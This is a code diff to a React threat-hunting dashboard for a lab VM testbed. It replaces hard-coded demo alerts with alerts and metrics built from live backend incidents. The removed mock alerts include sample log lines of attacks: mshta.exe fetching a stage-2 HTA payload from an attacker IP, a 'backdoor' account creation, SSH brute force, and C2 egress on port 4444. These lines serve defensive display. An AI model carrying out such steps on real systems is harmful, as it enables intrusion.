@@ -6,7 +6,7 @@ import {
   Search,
   Radio,
   FileText,
-  Play,
+  RotateCw,
   ChevronDown,
   X,
   Server,
@@ -19,8 +19,7 @@ interface ThreatHuntingDashboardProps {
   auditLogs: AuditLog[];
   onApprove: (id: number) => Promise<void>;
   onBlock: (id: number) => Promise<void>;
-  onTriggerReplay: () => Promise<void>;
-  isReplaying: boolean;
+  onRefresh?: () => Promise<void>;
 }
 
 export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
@@ -28,15 +27,14 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
   auditLogs,
   onApprove,
   onBlock,
-  onTriggerReplay,
-  isReplaying,
+  onRefresh,
 }) => {
   // Navigation & filter state
   const [activeTab, setActiveTab] = useState<"dashboard" | "events">("dashboard");
   const [searchQuery, setSearchQuery] = useState("");
-  const [selectedMonth, setSelectedMonth] = useState("Jan-Feb");
-  const [selectedYear, setSelectedYear] = useState("2024");
-  const [expandedAlertId, setExpandedAlertId] = useState<string | null>("row-1");
+  const [selectedMonth, setSelectedMonth] = useState("Live");
+  const [selectedYear, setSelectedYear] = useState("2026");
+  const [expandedAlertId, setExpandedAlertId] = useState<string | null>(null);
   const [exploreAgentOpen, setExploreAgentOpen] = useState(false);
   const [proofModalData, setProofModalData] = useState<{
     isOpen: boolean;
@@ -44,8 +42,8 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
     attackerIp: string;
   }>({
     isOpen: false,
-    incidentId: 101,
-    attackerIp: "192.168.56.20",
+    incidentId: incidents[0]?.id || 1,
+    attackerIp: incidents[0]?.source_ip || "192.168.56.20",
   });
   const [actionFeedback, setActionFeedback] = useState<string | null>(null);
   const [hoveredHour, setHoveredHour] = useState<string | null>(null);
@@ -55,99 +53,86 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
     setTimeout(() => setActionFeedback(null), 4000);
   };
 
-  // Base Wazuh security alerts from image, dynamically merged with live backend incidents
+  // Security alerts dynamically generated from live VM backend incidents and raw events
   const securityAlerts = useMemo(() => {
-    const list = [
-      {
-        id: "row-1",
-        time: "Jan 22, 2024 @ 09:55:20.518",
-        agentId: "004",
-        agentName: "Windows",
-        techniques: "T1218",
-        tactics: "Defense Evasion",
-        description: "Signed Script Proxy Execution: C:\\Windows\\System32\\mshta.exe spawned malicious VBScript payload",
-        level: 10,
-        ruleId: "255563",
-        sourceIp: "192.168.56.20",
-        raw: "Jan 22 09:55:20.518 win-ws04 winlogbeat: EventID 1: Process Creation: C:\\Windows\\System32\\mshta.exe http://192.168.56.20/stage2.hta",
-        status: "active",
-      },
-      {
-        id: "row-2",
-        time: "Jan 22, 2024 @ 09:54:12.842",
-        agentId: "001",
-        agentName: "Ubuntu",
-        techniques: "T1110",
-        tactics: "Credential Access",
-        description: "SSH Brute Force: 5 consecutive failed authentication attempts against root/admin accounts",
-        level: 12,
-        ruleId: "100101",
-        sourceIp: "192.168.56.20",
-        raw: "Jan 22 09:54:12 victim-server sshd[4102]: Failed password for invalid user root from 192.168.56.20 port 49150 ssh2",
-        status: "requires_containment",
-      },
-      {
-        id: "row-3",
-        time: "Jan 22, 2024 @ 09:52:05.110",
-        agentId: "002",
-        agentName: "Centos",
-        techniques: "T1136",
-        tactics: "Persistence",
-        description: "Suspicious User Account Creation: user 'backdoor' created outside authorized change window",
-        level: 10,
-        ruleId: "100102",
-        sourceIp: "192.168.56.20",
-        raw: "Jan 22 09:52:05 centos-gw useradd[4190]: new user: name=backdoor, UID=1003, GID=1003, home=/home/backdoor",
-        status: "verified",
-      },
-      {
-        id: "row-4",
-        time: "Jan 22, 2024 @ 09:48:33.450",
-        agentId: "005",
-        agentName: "Debian",
-        techniques: "T1041",
-        tactics: "Exfiltration",
-        description: "Suspicious Outbound C2 Channel: unexpected port 4444 outbound network connection",
-        level: 8,
-        ruleId: "100103",
-        sourceIp: "192.168.56.20",
-        raw: "Jan 22 09:48:33 debian-worker kernel: [UFW AUDIT] OUT=eth0 SRC=192.168.56.10 DST=192.168.56.20 PROTO=TCP SPT=54210 DPT=4444",
-        status: "mitigated",
-      },
-      {
-        id: "row-5",
-        time: "Jan 22, 2024 @ 09:45:18.220",
-        agentId: "003",
-        agentName: "macOS",
-        techniques: "T1078",
-        tactics: "Initial Access",
-        description: "Valid Accounts: interactive login from unusual geolocation IP",
-        level: 7,
-        ruleId: "100105",
-        sourceIp: "192.168.56.20",
-        raw: "Jan 22 09:45:18 macos-wk01 loginwindow[142]: USER_PROCESS: admin logged in via SSH",
-        status: "investigating",
-      },
-    ];
+    const list: Array<{
+      id: string;
+      incidentId: number;
+      time: string;
+      agentId: string;
+      agentName: string;
+      techniques: string;
+      tactics: string;
+      description: string;
+      level: number;
+      ruleId: string;
+      sourceIp: string;
+      raw: string;
+      status: string;
+    }> = [];
 
-    // Merge live incidents from backend if any exist
     if (incidents && incidents.length > 0) {
       incidents.forEach((inc) => {
-        const existing = list.find((item) => item.ruleId === `INC-${inc.id}` || item.id === `inc-${inc.id}`);
-        if (!existing) {
-          list.unshift({
+        const hits = inc.rule_hits || [];
+        const techniqueStr = hits.length > 0 
+          ? hits.map(h => h === "R1" ? "T1110 (Brute Force)" : h === "R2" ? "T1136 (Create Account)" : h === "R3" ? "T1041 (C2 Egress)" : h).join(", ")
+          : "T1110";
+        const tacticStr = hits.includes("R3")
+          ? "Exfiltration"
+          : hits.includes("R2")
+          ? "Persistence"
+          : "Credential Access";
+        const alertStatus = inc.status === "verified" 
+          ? "verified" 
+          : inc.status === "blocked" 
+          ? "mitigated" 
+          : "requires_containment";
+        const alertLevel = inc.severity === "high" ? 12 : inc.severity === "medium" ? 8 : 4;
+
+        if (inc.events && inc.events.length > 0) {
+          inc.events.forEach((ev) => {
+            const evTechnique = ev.event_type === "ssh_fail" || ev.event_type === "ssh_success" 
+              ? "T1110 (Brute Force)" 
+              : ev.event_type === "user_add" 
+              ? "T1136 (Create Account)" 
+              : "T1041 (Egress Exfiltration)";
+            const evTactic = ev.event_type === "egress" 
+              ? "Exfiltration" 
+              : ev.event_type === "user_add" 
+              ? "Persistence" 
+              : "Credential Access";
+
+            list.push({
+              id: `ev-${ev.id}`,
+              incidentId: inc.id,
+              time: ev.ts ? new Date(ev.ts).toLocaleString() : new Date(inc.created_at).toLocaleString(),
+              agentId: "001",
+              agentName: "Ubuntu-Victim",
+              techniques: evTechnique,
+              tactics: evTactic,
+              description: inc.summary || ev.raw_line || "System telemetry match",
+              level: alertLevel,
+              ruleId: `INC-${inc.id}`,
+              sourceIp: ev.source_ip || inc.source_ip || "192.168.56.20",
+              raw: ev.raw_line || `Raw line for event #${ev.id}`,
+              status: alertStatus,
+            });
+          });
+        } else {
+          list.push({
             id: `inc-${inc.id}`,
-            time: inc.created_at ? new Date(inc.created_at).toLocaleString() : "Jan 22, 2024 @ 10:00:00.000",
+            incidentId: inc.id,
+            time: inc.created_at ? new Date(inc.created_at).toLocaleString() : "Just now",
             agentId: "001",
             agentName: "Ubuntu-Victim",
-            techniques: inc.rule_hits?.join(", ") || "T1110",
-            tactics: "Active Intrusion",
-            description: inc.summary || "Suspicious kernel activity detected by daemon",
-            level: inc.severity === "high" ? 12 : 8,
+            techniques: techniqueStr,
+            tactics: tacticStr,
+            description: inc.summary || "Security event correlated by daemon",
+            level: alertLevel,
             ruleId: `INC-${inc.id}`,
             sourceIp: inc.source_ip || "192.168.56.20",
-            raw: inc.events?.[0]?.raw_line || `Kernel log match for incident #${inc.id}`,
-            status: inc.status === "verified" ? "verified" : inc.status === "blocked" ? "mitigated" : "requires_containment",
+            raw: `Correlated Incident #${inc.id} - ${inc.summary}`,
+            status: alertStatus,
           });
         }
       });
@@ -166,23 +151,44 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
     );
   }, [incidents, searchQuery]);
 
-  // Registered Agent inventory for modal
+  // Real registered VM testbed nodes
   const registeredAgents = [
-    { id: "001", name: "Ubuntu-Victim", os: "Linux (Ubuntu 24.04)", ip: "192.168.56.10", status: "Active", alerts: 14, lastSeen: "Just now" },
-    { id: "002", name: "Centos-Gateway", os: "Linux (CentOS 9 Stream)", ip: "192.168.56.15", status: "Active", alerts: 6, lastSeen: "1m ago" },
-    { id: "003", name: "macOS-Workstation", os: "macOS Sonoma 14.4", ip: "192.168.56.32", status: "Active", alerts: 2, lastSeen: "3m ago" },
-    { id: "004", name: "Windows-Workstation", os: "Windows 11 Enterprise", ip: "192.168.56.40", status: "Active", alerts: 8, lastSeen: "Just now" },
-    { id: "005", name: "Debian-Worker", os: "Linux (Debian 12 Bookworm)", ip: "192.168.56.50", status: "Active", alerts: 3, lastSeen: "5m ago" },
+    { id: "001", name: "Ubuntu-Victim", os: "Linux (Ubuntu 24.04 Server)", ip: "192.168.56.10", status: "Active (Telemetry Shipper)", alerts: securityAlerts.length, lastSeen: "Just now" },
+    { id: "002", name: "Attacker-Sandbox", os: "Linux (Kali / Hydra / Caldera)", ip: "192.168.56.20", status: "Monitored Subnet", alerts: 0, lastSeen: "Active" },
+    { id: "003", name: "Autonomous-SOC", os: "Host Laptop (FastAPI + LLM)", ip: "192.168.56.1", status: "Daemon Controller", alerts: 0, lastSeen: "Active" },
   ];
+
+  // Real-time KPI metrics derived from live incidents and raw events
+  const totalEventsCount = useMemo(() => {
+    return incidents.reduce((acc, inc) => acc + (inc.events?.length || 1), 0);
+  }, [incidents]);
+
+  const criticalAlertsCount = useMemo(() => {
+    return incidents.filter((i) => i.severity === "high").length;
+  }, [incidents]);
+
+  const authFailuresCount = useMemo(() => {
+    return incidents.reduce((acc, inc) => {
+      const fails = inc.events?.filter(e => e.event_type === "ssh_fail").length || 0;
+      return acc + fails;
+    }, 0);
+  }, [incidents]);
+
+  const authSuccessesCount = useMemo(() => {
+    return incidents.reduce((acc, inc) => {
+      const success = inc.events?.filter(e => e.event_type === "ssh_success").length || 0;
+      return acc + success;
+    }, 0);
+  }, [incidents]);
 
   // Report generation handler
   const handleGenerateReport = () => {
     const reportData = [
       ["SENTINEL FORGE / WAZUH SECURITY REPORT", `Generated on: ${new Date().toISOString()}`],
-      ["Total Telemetry Events", "174,649"],
-      ["Level 12+ Critical Alerts", "7"],
-      ["Authentication Failures", "33,587"],
-      ["Authentication Successes", "55"],
+      ["Total Telemetry Events", String(totalEventsCount)],
+      ["Level 12+ Critical Alerts", String(criticalAlertsCount)],
+      ["Authentication Failures", String(authFailuresCount)],
+      ["Authentication Successes", String(authSuccessesCount)],
       [],
       ["Alert ID", "Timestamp", "Agent ID", "OS", "Technique", "Tactic", "Level", "Status"],
       ...securityAlerts.map((a) => [a.id, a.time, a.agentId, a.agentName, a.techniques, a.tactics, String(a.level), a.status]),
@@ -264,21 +270,22 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
 
           {/* Right Status Indicators */}
           <div className="flex items-center space-x-2.5">
-            <button
-              onClick={onTriggerReplay}
-              disabled={isReplaying}
-              title="Trigger Zero-VM Threat Simulation"
-              className="h-8 px-3 rounded-lg border border-slate-200/90 bg-white hover:bg-slate-50 hover:border-slate-300 text-slate-700 text-xs font-medium shadow-[0_1px_2px_rgba(0,0,0,0.04)] active:scale-[0.98] transition-all flex items-center space-x-1.5 cursor-pointer disabled:opacity-50"
-            >
-              <Play className={`h-3.5 w-3.5 text-blue-600 fill-blue-600 ${isReplaying ? "animate-spin" : ""}`} />
-              <span>{isReplaying ? "Emulating..." : "Simulate Threat"}</span>
-            </button>
+            {onRefresh && (
+              <button
+                onClick={onRefresh}
+                title="Refresh Live Sensor Data"
+                className="h-8 px-3 rounded-lg border border-slate-200/90 bg-white hover:bg-slate-50 hover:border-slate-300 text-slate-700 text-xs font-medium shadow-[0_1px_2px_rgba(0,0,0,0.04)] active:scale-[0.98] transition-all flex items-center space-x-1.5 cursor-pointer"
+              >
+                <RotateCw className="h-3 w-3 text-blue-600" />
+                <span>Refresh Telemetry</span>
+              </button>
+            )}
             <div
               className="h-8 px-2.5 rounded-lg border border-emerald-200/80 bg-emerald-50/70 text-emerald-700 text-xs font-medium flex items-center space-x-1.5 shadow-[0_1px_2px_rgba(0,0,0,0.02)]"
-              title="System Online & Synchronized"
+              title="Victim VM Sensor Connected"
             >
               <span className="h-1.5 w-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
-              <span>Live</span>
+              <span>VM Sensor Live</span>
             </div>
           </div>
         </div>
@@ -386,33 +393,33 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
             <div className="grid grid-cols-2 md:grid-cols-4 gap-4 sm:gap-6 py-2">
               {/* Total */}
               <div className="text-center sm:text-left space-y-1">
-                <div className="text-xs font-medium text-slate-500">Total</div>
+                <div className="text-xs font-medium text-slate-500">Total Telemetry Events</div>
                 <div className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1E88E5] font-sans">
-                  174649
+                  {totalEventsCount}
                 </div>
               </div>
 
               {/* Level 12 or above alerts */}
               <div className="text-center sm:text-left space-y-1">
-                <div className="text-xs font-medium text-slate-500">Level 12 or above alerts</div>
+                <div className="text-xs font-medium text-slate-500">Critical Threats (Level 12+)</div>
                 <div className="text-3xl sm:text-4xl font-bold tracking-tight text-[#E53935] font-sans">
-                  {7 + (incidents?.length > 1 ? incidents.length - 1 : 0)}
+                  {criticalAlertsCount}
                 </div>
               </div>
 
               {/* Authentication failure */}
               <div className="text-center sm:text-left space-y-1">
-                <div className="text-xs font-medium text-slate-500">Authentication failure</div>
+                <div className="text-xs font-medium text-slate-500">Authentication Failures (R1)</div>
                 <div className="text-3xl sm:text-4xl font-bold tracking-tight text-[#E64A19] font-sans">
-                  33587
+                  {authFailuresCount}
                 </div>
               </div>
 
               {/* Authentication success */}
               <div className="text-center sm:text-left space-y-1">
-                <div className="text-xs font-medium text-slate-500">Authentication success</div>
+                <div className="text-xs font-medium text-slate-500">Authentication Successes</div>
                 <div className="text-3xl sm:text-4xl font-bold tracking-tight text-[#1565C0] font-sans">
-                  55
+                  {authSuccessesCount}
                 </div>
               </div>
             </div>
@@ -828,132 +835,158 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-slate-100">
-                    {securityAlerts.map((alert) => {
-                      const isExpanded = expandedAlertId === alert.id;
-                      return (
-                        <React.Fragment key={alert.id}>
-                          <tr
-                            onClick={() => setExpandedAlertId(isExpanded ? null : alert.id)}
-                            className={`hover:bg-slate-50/80 transition-colors cursor-pointer group ${
-                              isExpanded ? "bg-slate-50/50" : ""
-                            }`}
-                          >
-                            <td className="py-3 px-4 font-mono text-[11px] text-slate-600 whitespace-nowrap">
-                              <span className="text-slate-400 font-bold mr-1.5">&gt;</span>
-                              {alert.time}
-                            </td>
-                            <td className="py-3 px-4 font-mono text-blue-600 font-semibold hover:underline">
-                              {alert.agentId}
-                            </td>
-                            <td className="py-3 px-4 font-medium text-slate-800">
-                              {alert.agentName}
-                            </td>
-                            <td className="py-3 px-4 font-mono text-blue-600 font-medium hover:underline">
-                              {alert.techniques}
-                            </td>
-                            <td className="py-3 px-4 text-slate-700">
-                              {alert.tactics}
-                            </td>
-                            <td className="py-3 px-4 text-slate-700 leading-snug">
-                              {alert.description}
-                            </td>
-                            <td className="py-3 px-4 text-center">
-                              <span
-                                className={`inline-block px-2 py-0.5 rounded-full font-mono font-bold text-[10px] ${
-                                  alert.level >= 12
-                                    ? "bg-red-50 text-red-600 border border-red-200"
-                                    : alert.level >= 10
-                                    ? "bg-amber-50 text-amber-700 border border-amber-200"
-                                    : "bg-slate-100 text-slate-600 border border-slate-200"
-                                }`}
-                              >
-                                {alert.level}
+                    {securityAlerts.length === 0 ? (
+                      <tr>
+                        <td colSpan={9} className="py-16 text-center">
+                          <div className="max-w-md mx-auto space-y-3">
+                            <div className="inline-flex h-12 w-12 items-center justify-center rounded-2xl bg-blue-50 text-blue-600 border border-blue-200/60 shadow-xs">
+                              <Radio className="h-6 w-6 animate-pulse" />
+                            </div>
+                            <div>
+                              <h4 className="text-sm font-semibold text-slate-800">
+                                Live VM Telemetry Sensor Active
+                              </h4>
+                              <p className="text-xs text-slate-500 mt-1 leading-relaxed">
+                                Listening on <code className="font-mono text-slate-700 font-bold">192.168.56.1:8000/events</code> for raw kernel and firewall logs streamed from Ubuntu Server (<code className="font-mono text-slate-700">192.168.56.10</code>).
+                              </p>
+                            </div>
+                            <div className="pt-2">
+                              <span className="inline-flex items-center space-x-1.5 px-3 py-1 rounded-full text-[11px] font-mono font-medium bg-emerald-50 text-emerald-700 border border-emerald-200">
+                                <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                                <span>Awaiting Adversary Activity (Act 1, 2, or 3)</span>
                               </span>
-                            </td>
-                            <td className="py-3 px-4 font-mono text-blue-600 font-semibold hover:underline">
-                              {alert.ruleId}
-                            </td>
-                            <td className="py-3 px-4 text-right whitespace-nowrap">
-                              {alert.status === "requires_containment" ? (
-                                <button
-                                  onClick={(e) => {
-                                    e.stopPropagation();
-                                    void handleBlockAction(alert.sourceIp, 101);
-                                  }}
-                                  className="h-7 px-2.5 rounded-md bg-rose-600 hover:bg-rose-700 active:bg-rose-800 text-white font-medium text-[11px] shadow-[0_1px_2px_rgba(225,29,72,0.18),inset_0_1px_0_rgba(255,255,255,0.15)] border border-rose-700 active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1"
+                            </div>
+                          </div>
+                        </td>
+                      </tr>
+                    ) : (
+                      securityAlerts.map((alert) => {
+                        const isExpanded = expandedAlertId === alert.id;
+                        return (
+                          <React.Fragment key={alert.id}>
+                            <tr
+                              onClick={() => setExpandedAlertId(isExpanded ? null : alert.id)}
+                              className={`hover:bg-slate-50/80 transition-colors cursor-pointer group ${
+                                isExpanded ? "bg-slate-50/50" : ""
+                              }`}
+                            >
+                              <td className="py-3 px-4 font-mono text-[11px] text-slate-600 whitespace-nowrap">
+                                <span className="text-slate-400 font-bold mr-1.5">&gt;</span>
+                                {alert.time}
+                              </td>
+                              <td className="py-3 px-4 font-mono text-blue-600 font-semibold hover:underline">
+                                {alert.agentId}
+                              </td>
+                              <td className="py-3 px-4 font-medium text-slate-800">
+                                {alert.agentName}
+                              </td>
+                              <td className="py-3 px-4 font-mono text-blue-600 font-medium hover:underline">
+                                {alert.techniques}
+                              </td>
+                              <td className="py-3 px-4 text-slate-700">
+                                {alert.tactics}
+                              </td>
+                              <td className="py-3 px-4 text-slate-700 leading-snug">
+                                {alert.description}
+                              </td>
+                              <td className="py-3 px-4 text-center">
+                                <span
+                                  className={`inline-block px-2 py-0.5 rounded-full font-mono font-bold text-[10px] ${
+                                    alert.level >= 12
+                                      ? "bg-red-50 text-red-600 border border-red-200"
+                                      : alert.level >= 10
+                                      ? "bg-amber-50 text-amber-700 border border-amber-200"
+                                      : "bg-slate-100 text-slate-600 border border-slate-200"
+                                  }`}
                                 >
-                                  <span>Contain &amp; Prove</span>
-                                </button>
-                              ) : alert.status === "verified" ? (
-                                <button
-                                  onClick={(e) => {
-                                    e.stopPropagation();
-                                    setProofModalData({
-                                      isOpen: true,
-                                      incidentId: 101,
-                                      attackerIp: alert.sourceIp,
-                                    });
-                                  }}
-                                  className="h-7 px-2.5 rounded-md bg-emerald-50 hover:bg-emerald-100 text-emerald-800 border border-emerald-200/90 font-medium text-[11px] shadow-[0_1px_2px_rgba(0,0,0,0.02)] active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1"
-                                >
-                                  <span>Proof (RC=1)</span>
-                                </button>
-                              ) : (
-                                <span className="text-[11px] text-slate-400 font-medium">Monitored</span>
-                              )}
-                            </td>
-                          </tr>
-
-                          {/* Expanded Telemetry & Action Drawer */}
-                          {isExpanded && (
-                            <tr className="bg-slate-50/70 border-b border-slate-200/80">
-                              <td colSpan={9} className="p-5">
-                                <div className="space-y-3.5 bg-white p-5 rounded-2xl border border-slate-200/90 shadow-2xs">
-                                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
-                                    <div className="flex items-center space-x-2">
-                                      <span className="h-2 w-2 rounded-full bg-blue-600"></span>
-                                      <span className="font-semibold text-xs text-slate-800">
-                                        Raw Kernel Telemetry Payload ({alert.agentName})
-                                      </span>
-                                    </div>
-                                    <div className="flex items-center space-x-3 text-xs font-mono text-slate-500">
-                                      <span>Attacker IP: <strong className="text-slate-800">{alert.sourceIp}</strong></span>
-                                      <span>&bull;</span>
-                                      <span>Destination Port: <strong className="text-slate-800">22 (SSH)</strong></span>
-                                    </div>
-                                  </div>
-
-                                  <pre className="p-3 bg-slate-900 text-slate-100 rounded-xl text-[11px] font-mono overflow-x-auto leading-relaxed border border-slate-800">
-                                    {alert.raw}
-                                  </pre>
-
-                                  <div className="flex flex-wrap items-center justify-between gap-3 pt-1">
-                                    <p className="text-xs text-slate-500 max-w-2xl leading-relaxed">
-                                      Dual-custody response policy: Applying containment instructs the Linux kernel firewall to isolate <strong className="text-slate-700">{alert.sourceIp}</strong> and re-executes MITRE Caldera to verify packet drop.
-                                    </p>
-
-                                    <div className="flex items-center space-x-2">
-                                      <button
-                                        onClick={() => void handleApproveAction(101)}
-                                        className="h-8 px-3.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 hover:border-slate-300 text-slate-700 text-xs font-medium shadow-[0_1px_2px_rgba(0,0,0,0.04)] active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1.5"
-                                      >
-                                        <span>Authorize Response</span>
-                                      </button>
-                                      <button
-                                        onClick={() => void handleBlockAction(alert.sourceIp, 101)}
-                                        className="h-8 px-3.5 rounded-lg bg-slate-900 hover:bg-slate-800 active:bg-slate-950 text-white text-xs font-medium shadow-[0_1px_2px_rgba(15,23,42,0.08),inset_0_1px_0_rgba(255,255,255,0.15)] border border-slate-900 active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1.5"
-                                      >
-                                        <span>Block &amp; Verify via Caldera</span>
-                                      </button>
-                                    </div>
-                                  </div>
-                                </div>
+                                  {alert.level}
+                                </span>
+                              </td>
+                              <td className="py-3 px-4 font-mono text-blue-600 font-semibold hover:underline">
+                                {alert.ruleId}
+                              </td>
+                              <td className="py-3 px-4 text-right whitespace-nowrap">
+                                {alert.status === "requires_containment" ? (
+                                  <button
+                                    onClick={(e) => {
+                                      e.stopPropagation();
+                                      void handleBlockAction(alert.sourceIp, alert.incidentId);
+                                    }}
+                                    className="h-7 px-2.5 rounded-md bg-rose-600 hover:bg-rose-700 active:bg-rose-800 text-white font-medium text-[11px] shadow-[0_1px_2px_rgba(225,29,72,0.18),inset_0_1px_0_rgba(255,255,255,0.15)] border border-rose-700 active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1"
+                                  >
+                                    <span>Contain &amp; Prove</span>
+                                  </button>
+                                ) : alert.status === "verified" ? (
+                                  <button
+                                    onClick={(e) => {
+                                      e.stopPropagation();
+                                      setProofModalData({
+                                        isOpen: true,
+                                        incidentId: alert.incidentId,
+                                        attackerIp: alert.sourceIp,
+                                      });
+                                    }}
+                                    className="h-7 px-2.5 rounded-md bg-emerald-50 hover:bg-emerald-100 text-emerald-800 border border-emerald-200/90 font-medium text-[11px] shadow-[0_1px_2px_rgba(0,0,0,0.02)] active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1"
+                                  >
+                                    <span>Proof (RC=1)</span>
+                                  </button>
+                                ) : (
+                                  <span className="text-[11px] text-slate-400 font-medium">Monitored</span>
+                                )}
                               </td>
                             </tr>
-                          )}
-                        </React.Fragment>
-                      );
-                    })}
+
+                            {/* Expanded Telemetry & Action Drawer */}
+                            {isExpanded && (
+                              <tr className="bg-slate-50/70 border-b border-slate-200/80">
+                                <td colSpan={9} className="p-5">
+                                  <div className="space-y-3.5 bg-white p-5 rounded-2xl border border-slate-200/90 shadow-2xs">
+                                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
+                                      <div className="flex items-center space-x-2">
+                                        <span className="h-2 w-2 rounded-full bg-blue-600"></span>
+                                        <span className="font-semibold text-xs text-slate-800">
+                                          Raw Kernel Telemetry Payload ({alert.agentName})
+                                        </span>
+                                      </div>
+                                      <div className="flex items-center space-x-3 text-xs font-mono text-slate-500">
+                                        <span>Attacker IP: <strong className="text-slate-800">{alert.sourceIp}</strong></span>
+                                        <span>&bull;</span>
+                                        <span>Destination Port: <strong className="text-slate-800">22 (SSH)</strong></span>
+                                      </div>
+                                    </div>
+
+                                    <pre className="p-3 bg-slate-900 text-slate-100 rounded-xl text-[11px] font-mono overflow-x-auto leading-relaxed border border-slate-800">
+                                      {alert.raw}
+                                    </pre>
+
+                                    <div className="flex flex-wrap items-center justify-between gap-3 pt-1">
+                                      <p className="text-xs text-slate-500 max-w-2xl leading-relaxed">
+                                        Dual-custody response policy: Applying containment instructs the Linux kernel firewall to isolate <strong className="text-slate-700">{alert.sourceIp}</strong> and re-executes MITRE Caldera to verify packet drop.
+                                      </p>
+
+                                      <div className="flex items-center space-x-2">
+                                        <button
+                                          onClick={() => void handleApproveAction(alert.incidentId)}
+                                          className="h-8 px-3.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 hover:border-slate-300 text-slate-700 text-xs font-medium shadow-[0_1px_2px_rgba(0,0,0,0.04)] active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1.5"
+                                        >
+                                          <span>Authorize Response</span>
+                                        </button>
+                                        <button
+                                          onClick={() => void handleBlockAction(alert.sourceIp, alert.incidentId)}
+                                          className="h-8 px-3.5 rounded-lg bg-slate-900 hover:bg-slate-800 active:bg-slate-950 text-white text-xs font-medium shadow-[0_1px_2px_rgba(15,23,42,0.08),inset_0_1px_0_rgba(255,255,255,0.15)] border border-slate-900 active:scale-[0.98] transition-all cursor-pointer inline-flex items-center space-x-1.5"
+                                        >
+                                          <span>Block &amp; Verify via Caldera</span>
+                                        </button>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </td>
+                              </tr>
+                            )}
+                          </React.Fragment>
+                        );
+                      })
+                    )}
                   </tbody>
                 </table>
               </div>
@@ -973,14 +1006,10 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
                   Tamper-evident ledger of every detection, human authorization, and Caldera proof.
                 </p>
               </div>
-              <button
-                onClick={onTriggerReplay}
-                disabled={isReplaying}
-                className="btn-metallic-primary h-8 px-3 rounded-lg text-xs font-medium flex items-center space-x-1.5"
-              >
-                <Play className="h-3.5 w-3.5" />
-                <span>Simulate Inbound Threat</span>
-              </button>
+              <div className="flex items-center space-x-2 text-xs font-mono text-emerald-700 bg-emerald-50 px-3 py-1.5 rounded-lg border border-emerald-200">
+                <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                <span>Ledger Synchronized</span>
+              </div>
             </div>
 
             <div className="bg-white border border-slate-200/80 rounded-2xl shadow-[0_2px_12px_rgba(0,0,0,0.03)] overflow-hidden">
@@ -1012,8 +1041,8 @@ export const ThreatHuntingDashboard: React.FC<ThreatHuntingDashboardProps> = ({
                       ))
                     ) : (
                       <tr>
-                        <td colSpan={5} className="py-8 text-center text-slate-400 font-sans">
-                          No audit events recorded yet. Click &quot;Simulate Inbound Threat&quot; to test.
+                        <td colSpan={5} className="py-12 text-center text-slate-400 font-sans">
+                          No audit ledger events recorded yet. Containment actions and Caldera verification entries will be logged here.
                         </td>
                       </tr>
                     )}
